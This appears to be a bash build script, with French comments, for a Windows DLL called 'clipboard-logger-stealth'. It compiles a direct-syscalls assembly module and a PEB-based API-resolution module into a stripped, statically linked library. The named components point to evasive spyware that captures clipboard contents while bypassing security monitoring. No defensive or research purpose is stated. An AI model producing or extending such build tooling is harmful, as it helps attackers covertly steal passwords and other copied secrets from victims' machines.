# Script de build pour clipboard-logger
# Utilise x86_64-w64-mingw32-gcc pour générer une DLL 64-bit compatible Windows.

# Nom du fichier de sortie
OUTPUT_DLL="build/clipboard-logger-stealth.dll"
SOURCE_FILE="src/clipboard-logger-stealth.c"
OBJECT_FILE="build/clipboard-logger-stealth.o"
DIRECT_SYSCALLS_SRC=src/direct-syscalls.asm
DIRECT_SYSCALLS_OBJECT=build/direct-syscalls.o
PEB_LOOKUP_SRC=src/peb-lookup.c
PEB_LOOKUP_OBJECT=build/peb-lookup.o

if [ -d build ]; then
    rm -Rf build
fi
mkdir build

# Options de compilation :
# -shared : Générer une DLL
# -s : Retirer les symboles de debug pour réduire la taille
# -ffunction-sections -fdata-sections : Optimiser les sections
# -Wl,--gc-sections : Nettoyer les sections inutilisées
# -luser32 -lshell32 -lkernel32 : Bibliothèques Windows nécessaires
# -static-libgcc : Inclure statiquement la libgcc pour éviter les dépendances externes


echo "Compilation de la lib de direct syscalls"
nasm -f win64 $DIRECT_SYSCALLS_SRC -o $DIRECT_SYSCALLS_OBJECT 

echo "Compilation de la lib de résolution des API"
x86_64-w64-mingw32-gcc -Iinclude -c $PEB_LOOKUP_SRC -o $PEB_LOOKUP_OBJECT

echo "Compilation de $PEB_LOOKUP_SRC vers $OUTPUT_DLL..."
x86_64-w64-mingw32-gcc -Iinclude -c $SOURCE_FILE -o $OBJECT_FILE
x86_64-w64-mingw32-gcc -Iinclude -shared -o $OUTPUT_DLL $OBJECT_FILE $DIRECT_SYSCALLS_OBJECT $PEB_LOOKUP_OBJECT\
    -s -ffunction-sections -fdata-sections -Wl,--gc-sections \
    -luser32 -lshell32 -lkernel32 -luser32 \
    -static-libgcc

if [ $? -eq 0 ]; then
    echo "Build réussi : $OUTPUT_DLL"
else
    echo "Erreur lors de la compilation."
    exit 1
fi

